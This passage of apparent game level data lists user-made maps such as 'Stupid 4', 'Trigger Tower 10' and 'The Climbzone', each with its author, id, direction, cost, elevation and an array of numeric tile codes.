Pencil",id="#1666427493",direction="forward",cost=135,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0,0,0,0,12,12,0,0,0,0,1,132,12,1,1,12,132,1,0,0,0,0,0,0,12,12,0,0,0,0,1,12,12,1,1,12,12,1,0,0,0,0,0,0,12,12,0,0,0,0,1,12,12,1,1,12,12,1,0,0,0,0,0,0,12,12,0,0,0,0,1,12,12,1,1,12,12,1,0,0,0,12,12,12,12,12,0,0,0,0,1,12,12,1,1,12,12,1,0,0,0,12,131,12,12,12,0,0,0,0,1,12,12,1,1,12,12,1,0,0,0,12,12,12,12,12,0,0,0,0,1,12,12,1,1,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,1,85,12,1,1,12,86,1,0,0,0,0,0,0,0,0,0,0,0,0,1,12,85,1,1,86,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,85,12,12,12,12,86,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,85,12,12,86,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Stupid 4",author="TF2 Pencil",id="#1666427526",direction="left",cost=280,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,2,14,14,14,1,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,2,14,14,14,1,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,14,14,1,1,1,1,1,1,1,1,1,1,1,14,14,0,0,0,0,0,14,14,14,14,135,135,135,135,135,135,135,135,135,14,14,0,0,0,0,0,14,14,14,14,135,135,135,135,135,135,135,135,135,14,14,0,0,0,0,0,14,14,1,1,1,1,1,1,1,1,1,1,1,14,14,0,0,0,0,0,14,14,14,14,135,135,135,135,135,135,135,135,135,14,14,0,0,0,0,0,14,14,14,14,135,135,135,135,135,135,135,135,135,14,14,0,0,0,0,0,14,14,1,1,1,1,1,1,1,1,1,1,1,14,14,0,0,0,0,0,14,14,18,18,132,1,14,14,135,135,135,135,135,14,14,0,0,0,0,0,14,14,18,93,18,1,131,14,135,135,135,135,135,14,14,0,0,0,0,0,14,14,1,1,1,1,1,1,1,1,1,1,1,14,14,0,0,0,0,0,14,14,18,18,132,1,14,14,135,135,135,135,135,14,14,0,0,0,0,0,14,14,18,94,18,1,131,14,135,135,135,135,135,14,14,0,0,0,0,0,14,14,1,1,1,1,1,1,1,1,1,1,1,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Dont Touch TP",author="TF2 Pencil",id="#1666427762",direction="forward",cost=406,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,1,1,1,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,1,132,14,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,1,14,14,1,14,14,1,1,1,1,1,1,1,1,1,1,1,1,0,0,1,14,14,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,1,96,96,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,14,14,14,1,14,14,1,131,131,131,131,131,131,131,131,131,14,14,0,0,14,14,14,96,14,14,1,131,131,131,131,131,131,131,131,131,14,14,0,0,14,14,14,96,14,14,1,14,14,14,14,14,14,14,14,14,14,14,0,0,14,14,14,1,1,1,1,14,131,131,131,131,131,131,131,131,131,131,0,0,97,14,14,131,131,131,131,14,14,14,14,14,14,14,14,14,14,14,0,0,14,14,14,131,131,131,131,131,131,131,131,131,131,131,131,131,131,14,0,0,14,14,14,131,131,131,14,14,14,131,14,14,14,131,14,14,14,14,0,0,14,14,14,131,131,131,14,131,14,131,14,131,14,131,14,131,131,131,0,0,14,14,14,14,14,14,14,131,14,14,14,131,14,14,14,131,131,131,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger Tower 10",author="TF2 Pencil",id="#1666427906",direction="forward",cost=160,elevation=14,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,8,8,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,97,28,0,108,8,8,8,8,108,0,28,97,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,3,3,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,15,15,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,15,96,96,15,1,0,0,0,0,0,0,0,0,0,35,35,0,35,0,115,15,15,15,15,115,0,35,0,35,35,0,0,0,0,99,35,0,35,0,115,15,15,15,15,115,0,35,0,35,99,0,0,0,0,0,0,0,0,0,1,15,15,15,15,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,3,3,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,22,22,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,22,98,98,22,1,0,0,0,0,0,0,0,0,102,0,0,0,0,0,1,22,22,22,22,1,0,0,0,0,0,102,0,0,42,0,0,42,0,0,22,22,22,22,22,22,0,0,42,0,0,42,0,0,0,0,0,0,0,0,1,101,101,101,101,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,22,22,22,22,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger tower 14",author="TF2 Pencil",id="#1666427934",direction="left",cost=210,elevation=15,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,5,5,1,0,0,0,2,20,20,96,20,20,20,20,20,97,1,5,5,5,5,5,1,0,0,0,2,20,20,96,20,20,20,20,20,20,1,5,5,5,5,5,1,0,0,0,0,0,0,1,3,3,0,0,0,0,1,3,5,5,5,5,1,0,0,0,0,0,0,1,5,5,0,0,0,0,1,20,5,94,93,5,1,0,0,0,0,0,0,1,5,5,20,20,20,20,1,5,5,93,94,5,1,0,0,0,0,0,0,1,96,1,20,1,1,1,1,20,5,5,5,5,1,0,0,0,0,0,0,1,5,1,20,5,5,20,1,20,20,20,5,5,1,0,0,0,0,0,0,1,5,5,5,5,5,5,1,1,1,5,5,5,1,0,0,0,0,0,0,1,5,5,5,5,5,5,1,1,1,20,5,5,1,0,0,0,0,0,0,1,5,5,5,5,5,20,5,5,20,20,5,5,1,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Crowded Rooms 9",author="TF2 Pencil",id="#1666428189",direction="left",cost=291,elevation=14,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,108,108,1,0,0,0,0,1,117,118,119,120,1,11,94,93,11,1,108,108,108,108,1,0,0,2,22,22,56,122,122,121,1,11,94,93,11,1,108,108,108,108,108,28,0,2,22,22,56,122,122,122,1,11,11,11,11,1,108,108,108,108,1,30,0,0,0,1,115,114,113,112,111,11,11,11,11,1,108,108,108,108,1,32,0,0,0,1,1,1,1,1,1,1,1,1,111,1,1,1,1,96,1,34,0,0,0,1,11,11,11,11,1,11,11,11,11,1,109,109,108,108,1,97,0,0,0,1,11,66,66,11,111,11,90,90,11,1,109,109,108,108,1,0,0,0,0,1,11,66,66,11,111,11,90,90,11,1,110,110,111,111,1,0,0,0,0,1,11,11,11,11,1,11,11,11,11,1,110,110,111,111,1,0,0,0,0,1,111,1,1,1,1,1,1,1,1,1,1,1,111,111,1,0,0,0,0,1,11,11,11,91,1,99,17,51,51,1,11,11,11,11,1,0,0,0,0,1,11,11,91,11,1,17,17,51,51,1,11,11,11,11,1,0,0,0,0,1,11,91,11,111,98,11,11,51,51,1,11,11,11,11,1,0,0,0,0,1,91,11,11,11,1,51,51,51,51,51,11,11,11,11,1,0,0,0,0,1,1,1,1,1,1,117,1,1,51,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,37,35,33,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Crowded Rooms 10",author="TF2 Pencil",id="#1666428265",direction="left",cost=208,elevation=15,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,9,9,0,0,0,0,0,0,0,0,0,1,24,24,24,24,132,1,97,1,109,109,0,0,0,0,0,0,0,0,0,1,24,24,24,24,24,1,9,1,109,109,1,0,0,0,0,0,0,0,0,1,24,24,24,24,24,1,142,1,109,109,1,0,0,0,0,0,0,0,0,1,24,24,24,24,24,1,142,1,109,109,1,0,0,0,0,2,24,24,24,24,24,24,24,24,24,1,142,1,109,109,1,0,0,0,0,2,24,24,24,24,24,24,24,24,24,1,142,1,9,9,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,109,109,9,141,1,0,0,0,0,0,0,0,0,1,121,120,119,118,1,1,1,1,1,14,1,0,0,0,0,0,0,0,0,1,122,124,124,117,1,14,90,14,14,96,1,0,0,0,0,0,0,0,0,1,123,124,124,116,1,14,14,14,90,14,1,0,0,0,0,0,0,0,0,1,124,124,124,115,1,14,90,14,14,14,1,0,0,0,0,0,0,0,0,1,124,124,124,114,98,14,14,14,90,14,14,0,0,0,0,0,0,0,0,1,1,64,64,1,1,1,1,1,1,14,99,0,0,0,0,0,0,0,0,0,0,24,24,24,24,131,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,131,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Prop Room",author="TF2 Pencil",id="#1666428331",direction="forward",cost=238,elevation=0,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,112,112,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,1,112,112,112,112,112,112,112,112,112,112,112,112,1,0,0,0,0,0,0,1,112,90,112,112,112,90,112,112,112,90,112,112,1,0,0,0,0,0,0,1,112,112,112,90,112,112,112,90,112,112,112,90,1,0,0,0,0,0,0,1,112,90,112,112,112,90,112,112,112,90,112,112,1,0,0,0,0,0,0,1,112,112,112,90,112,112,112,90,112,112,112,90,1,0,0,0,0,0,0,1,112,90,112,112,112,90,112,112,112,90,112,112,1,0,0,0,0,0,0,1,112,112,112,90,112,112,112,90,112,112,112,90,1,0,0,0,0,0,0,1,112,90,112,112,112,90,112,112,112,90,112,112,1,0,0,0,0,0,0,1,112,112,112,90,112,112,112,90,112,112,112,90,1,0,0,0,0,0,0,1,112,90,112,112,112,90,112,112,112,90,112,112,1,0,0,0,0,0,0,1,112,112,112,90,112,112,112,90,112,112,112,90,1,0,0,0,0,0,0,1,112,112,112,112,112,112,112,112,112,112,112,112,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,112,112,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0]});
maps.push({name="Climbing Lesson",author="Mini",id="#1666441575",direction="forward",cost=198,elevation=18,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,23,23,23,23,23,23,23,23,23,23,23,0,0,0,0,0,0,0,5,5,23,23,23,23,23,23,23,23,23,23,23,0,0,0,0,0,0,0,5,5,23,23,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,5,5,23,23,0,0,0,0,0,0,0,23,23,0,0,0,0,1,1,0,5,5,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,5,5,23,23,0,0,0,0,0,0,0,57,57,57,57,57,0,141,24,1,5,5,23,23,0,1,1,0,0,0,0,57,57,57,57,57,0,141,24,1,5,5,23,23,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,5,5,23,23,1,18,141,0,51,51,51,51,51,0,0,0,0,1,1,0,5,5,23,23,1,18,141,0,51,51,51,51,51,0,0,0,0,1,1,0,5,5,23,23,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,5,5,23,23,0,1,1,0,0,0,0,45,45,45,45,45,0,141,12,1,5,5,23,23,0,0,0,0,0,0,0,45,45,45,45,45,0,141,12,1,5,5,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,5,5,23,23,0,0,0,0,0,0,0,5,5,0,0,0,0,1,1,0,5,5,23,23,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,5,5,23,23,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,23,23,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Ruins of Luck",author="Mini",id="#1666445057",direction="forward",cost=252,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,5,5,1,1,1,1,0,0,0,0,0,0,0,14,14,14,14,65,65,65,5,5,65,65,65,14,14,14,14,0,0,0,0,100,14,132,14,65,65,65,5,5,65,65,65,14,132,14,100,0,0,0,0,14,14,14,14,65,65,65,5,5,65,65,65,14,14,14,14,0,0,0,0,0,0,0,67,65,65,5,5,5,5,65,65,67,0,0,0,0,0,0,0,0,0,0,67,65,65,5,131,94,5,65,65,67,0,0,0,0,0,0,0,0,0,0,67,65,65,5,94,131,5,65,65,67,0,0,0,0,0,0,0,0,0,0,67,65,65,5,5,5,5,65,65,67,0,0,0,0,0,0,0,14,14,14,14,65,65,65,5,5,65,65,65,14,14,14,14,0,0,0,0,100,14,132,14,65,65,65,5,5,65,65,65,14,132,14,100,0,0,0,0,14,14,14,14,65,65,65,5,5,65,65,65,14,14,14,14,0,0,0,0,0,0,0,1,1,1,1,5,5,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="My Name Is Lenny",author="Mini",id="#1666449106",direction="forward",cost=84,elevation=0,map=[0,0,0,0,0,0,14,94,14,2,2,14,94,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,16,16,16,16,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,16,0,0,0,0,16,14,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,16,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,16,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,16,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,16,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,14,16,0,0,0,0,16,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,16,16,16,16,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,94,14,2,2,14,94,14,0,0,0,0,0,0]});
maps.push({name="Stupid 6",author="TF2 Pencil",id="#1666470270",direction="right",cost=346,elevation=0,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,1,1,1,1,1,1,1,1,1,1,13,13,13,0,0,0,0,0,13,13,66,66,69,69,69,69,69,69,69,66,13,13,13,0,0,0,0,0,13,13,66,66,69,69,69,69,69,69,69,66,13,13,13,0,0,0,0,0,13,13,66,1,1,1,1,1,1,1,1,1,13,13,13,0,0,0,0,0,13,13,66,66,69,69,69,69,69,69,69,66,13,13,13,0,0,0,0,0,13,13,66,66,69,69,69,69,69,69,69,66,13,13,13,0,0,0,0,0,13,13,66,1,1,1,1,1,1,1,1,1,13,13,13,0,0,0,0,0,13,13,66,66,69,69,69,69,69,69,69,66,13,13,13,0,0,0,0,0,13,13,66,66,69,69,69,69,69,69,69,66,13,13,13,0,0,0,0,0,13,13,66,1,1,1,1,1,1,1,1,1,13,13,13,0,0,0,0,0,13,13,66,66,69,69,69,69,69,69,69,66,13,13,13,2,0,0,0,0,1,1,66,66,69,69,69,69,69,69,69,66,13,13,13,2,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Jumps For Items",author="TF2 Pencil",id="#1666470367",direction="forward",cost=118,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,29,29,0,0,29,0,0,29,29,0,29,0,29,0,9,9,0,0,0,0,29,29,0,0,29,0,0,97,29,0,29,0,29,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,29,29,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,33,33,33,33,33,33,33,33,33,0,9,9,0,0,0,0,0,0,0,0,33,33,93,33,93,33,93,33,33,0,9,9,0,0,0,0,29,29,31,33,33,93,33,93,33,93,33,93,33,0,9,9,0,0,0,0,29,29,31,33,33,33,93,33,93,33,93,33,33,0,96,96,0,0,0,0,0,0,0,0,33,33,33,33,33,33,33,33,33,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0]});
maps.push({name="Elevators",author="TF2 Pencil",id="#1666470442",direction="left",cost=208,elevation=16,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,22,22,22,22,14,14,14,0,14,14,14,14,6,6,6,6,6,0,0,0,22,22,22,22,92,14,14,0,14,14,14,14,92,6,6,6,6,0,0,0,22,22,22,22,14,14,14,0,14,14,14,14,6,6,6,0,0,0,0,0,22,22,22,22,14,14,14,0,14,14,14,14,6,6,6,0,0,0,0,0,22,22,22,22,92,14,14,0,14,14,14,14,92,6,6,0,0,0,0,0,22,22,22,22,14,14,14,0,14,14,14,14,6,6,6,0,0,0,0,0,22,22,22,22,14,14,14,0,14,14,14,14,6,6,6,0,0,0,0,0,22,22,22,22,92,14,14,0,14,14,14,14,92,6,6,0,0,0,0,0,22,22,22,22,14,14,14,0,14,14,14,14,6,6,6,0,0,0,0,0,22,22,22,22,14,14,14,0,14,14,14,14,6,6,6,0,0,0,2,22,22,22,22,22,92,14,14,0,14,14,14,14,92,6,6,0,0,0,2,22,22,22,22,22,14,14,14,0,14,14,14,14,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="4 Kinds of Traps",author="TF2 Pencil",id="#1666470554",direction="forward",cost=187,elevation=6,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,1,1,1,1,0,1,1,1,1,12,1,1,1,1,0,1,1,1,1,0,1,132,18,1,0,1,132,18,1,12,1,132,18,1,0,1,132,18,1,0,1,18,18,1,0,1,18,18,1,12,1,18,18,1,0,1,18,18,1,0,1,18,18,1,0,1,18,18,1,12,1,18,18,1,0,1,18,18,1,0,0,85,18,0,0,0,18,86,0,12,0,88,18,0,0,0,18,87,0,0,0,18,18,0,0,0,18,18,0,12,0,18,18,0,0,0,18,18,0,0,0,18,85,0,0,0,86,18,0,12,0,18,88,0,0,0,87,18,0,0,0,18,18,0,0,0,18,18,0,131,0,18,18,0,0,0,18,18,0,0,0,85,18,0,0,0,18,86,0,0,0,88,18,0,0,0,18,87,0,0,0,18,18,0,0,0,18,18,0,0,0,18,18,0,0,0,18,18,0,0,0,18,85,0,0,0,86,18,0,0,0,18,88,0,0,0,87,18,0,0,0,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,0,0,0,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0]});
maps.push({name="Stupid 8",author="TF2 Pencil",id="#1666470660",direction="forward",cost=211,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,1,142,142,1,142,142,1,142,142,1,142,142,1,0,0,0,0,0,0,0,1,142,142,1,142,142,1,142,142,1,142,142,1,0,0,0,0,0,0,0,1,19,19,1,19,19,1,19,19,1,19,19,1,0,0,0,0,0,0,0,1,131,19,1,133,19,1,133,19,1,131,19,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,23,134,1,23,132,1,23,132,1,23,134,1,0,0,0,0,0,0,0,1,94,23,1,94,23,1,93,23,1,93,23,1,0,0,0,0,0,0,0,1,23,23,1,23,23,1,23,23,1,23,23,1,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0]});
maps.push({name="The Climbzone",author="Mini",id="#1666470700",direction="forward",cost=278,elevation=19,map=[0,24,24,24,24,24,24,0,5,2,2,5,0,24,24,24,24,24,24,0,24,24,24,24,24,24,24,24,94,5,5,94,24,24,24,24,24,24,24,24,99,24,0,141,141,0,24,24,0,25,25,0,24,24,0,141,141,0,24,97,0,0,0,0,0,0,0,24,0,25,25,0,24,0,0,0,0,0,0,0,0,0,1,0,0,1,0,24,0,25,25,0,24,0,1,0,0,1,0,0,0,0,1,114,114,1,0,133,0,25,25,0,131,0,1,114,114,1,0,0,0,0,1,85,85,1,0,0,0,25,25,0,0,0,1,85,85,1,0,0,0,0,1,114,114,1,0,0,0,25,25,0,0,0,1,114,114,1,0,0,0,0,1,85,85,1,0,0,5,5,5,5,0,0,1,85,85,1,0,0,0,0,1,114,114,1,0,0,90,5,5,90,0,0,1,114,114,1,0,0,0,0,1,4,4,1,0,0,5,5,5,5,0,0,1,4,4,1,0,0,0,0,0,8,8,0,90,5,5,106,106,5,5,90,0,8,8,0,0,0,0,0,0,85,8,0,0,5,1,96,96,1,5,0,0,8,85,0,0,0,0,0,0,8,8,0,0,5,1,98,98,1,5,0,0,8,8,0,0,0,0,0,0,8,8,0,5,5,1,106,106,1,5,5,0,8,8,0,0,0,0,0,0,8,8,8,4,4,1,3,3,1,4,4,8,8,8,0,0,0,0,0,0,8,85,8,8,8,1,24,24,1,8,8,8,85,8,0,0,0,0,0,0,8,8,8,134,1,90,24,24,90,1,132,8,8,8,0,0,0,0,0,0,8,93,8,90,1,24,24,24,24,1,90,8,93,8,0,0,0,0,0,0,0,0,0,1,90,24,2,2,24,90,1,0,0,0,0,0,0]});
maps.push({name="Prop Room 2",author="TF2 Pencil",id="#1666470758",direction="forward",cost=324,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,116,116,1,1,1,1,1,0,0,1,1,1,1,1,1,1,1,1,0,1,116,116,116,116,116,116,1,36,36,116,116,116,116,116,116,116,116,1,0,1,116,90,90,90,90,116,1,36,36,116,116,90,116,90,116,90,116,1,0,1,116,116,116,116,116,116,1,36,36,1,116,90,116,90,116,90,116,1,0,1,116,90,90,90,90,116,1,36,36,1,116,90,116,90,116,90,116,1,0,1,116,116,116,116,116,116,1,36,36,1,116,90,116,90,116,90,116,1,0,1,116,90,90,90,90,116,1,36,36,1,116,90,116,90,116,90,116,1,0,1,116,116,116,116,116,116,1,36,36,1,116,90,116,90,11